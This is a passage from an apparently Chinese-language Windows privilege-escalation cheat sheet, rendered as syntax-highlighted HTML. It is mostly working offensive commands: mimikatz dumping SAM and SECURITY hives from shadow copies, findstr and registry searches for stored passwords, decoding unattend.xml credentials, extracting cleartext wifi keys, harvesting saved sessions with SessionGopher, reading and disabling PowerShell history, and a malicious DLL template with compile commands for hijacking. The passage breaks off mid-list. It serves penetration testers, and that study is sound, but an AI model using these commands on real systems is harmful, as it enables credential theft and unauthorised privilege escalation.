</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix</a></li>
</ul>

<h3 id="搜索文件内容中的-password">搜索文件内容中的 password</h3>
<p>在 .xml, .ini, .txt .config 等文件中搜索 Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>在远程地址例如 SMB Shares 或 SharePoint 搜索</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="搜索和-password-相关的文件名">搜索和 password 相关的文件名</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="搜索和-password-相关的注册表">搜索和 password 相关的注册表</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="在-unattendxml-中搜索密码">在 unattend.xml 中搜索密码</h3>
<p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installs提权 - zpchcbd - 博客园</a></li>
</ul>

<h3 id="iis-web-config-中的密码">IIS Web config 中的密码</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="其他可能存在凭证的文件">其他可能存在凭证的文件</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-密码">Wifi 密码</h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。</p>

<h3 id="便笺中存放的密码">便笺中存放的密码</h3>
<p>The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="服务中存放的密码">服务中存放的密码</h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-中存放的密码">Key Manager 中存放的密码</h3>
<p>This software will display its output in a GUI</p>

<p>下面的命令将打开 windows 凭据管理器。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-历史记录中存放的密码">Powershell 历史记录中存放的密码</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>关闭 ps 历史记录</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-文件">Powershell Transcript 文件</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="备用数据流ads中的密码">备用数据流（ADS）中的密码</h3>
<p>ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。</p>

<p>例如在 notepad 中编辑但未保存到文件的数据。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h2 id="进程相关提权方式">进程相关提权方式</h2>
<h3 id="哪些进程在运行">哪些进程在运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="哪些进程以-system-权限运行">哪些进程以 system 权限运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。</p>

<h3 id="powershell-版本">Powershell 版本</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="枚举已安装程序">枚举已安装程序</h3>
<p>已安装程序可作为提权突破点。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="枚举已安装服务">枚举已安装服务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="枚举计划任务">枚举计划任务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="枚举自启动应用">枚举自启动应用</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>

<h2 id="利用服务权限错误提权">利用服务权限错误提权</h2>
<p>以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。</p>
<h3 id="dll-劫持">DLL 劫持</h3>
<ol>
  <li>寻找 DLL 劫持利用点
    <ol>
      <li>PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for “Name Not Found”</li>
    </ol>
  </li>
  <li>编译恶意 DLL
    <ol>
      <li>For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
      <li>For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
    </ol>

    <p>windows_dll.c 内容</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>寻找权限配置不当的 PATH 目录
